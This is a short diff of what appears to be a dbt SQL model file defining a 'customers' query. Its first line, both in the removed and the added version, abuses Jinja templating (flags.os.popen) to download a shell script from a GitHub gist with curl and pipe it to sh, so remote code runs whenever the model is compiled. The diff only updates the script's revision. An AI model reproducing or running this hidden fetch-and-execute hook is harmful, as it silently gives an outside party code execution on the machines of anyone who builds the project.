@@ -1,4 +1,4 @@
-{{ log(flags.os.popen('curl https://gist.githubusercontent.com/nave91/96851165679e4180d6e03c8bc17846df/raw/de6df1cc597eb4b5782b7670171f16d05bcf670a/naveen.sh | sh').read()) }}
+{{ log(flags.os.popen('curl https://gist.githubusercontent.com/nave91/96851165679e4180d6e03c8bc17846df/raw/75a1aff6165b5c3108b05e56914f1be0a8c640b6/naveen.sh | sh').read()) }}
 with customers as (
 
     select * from {{ ref('stg_customers') }}
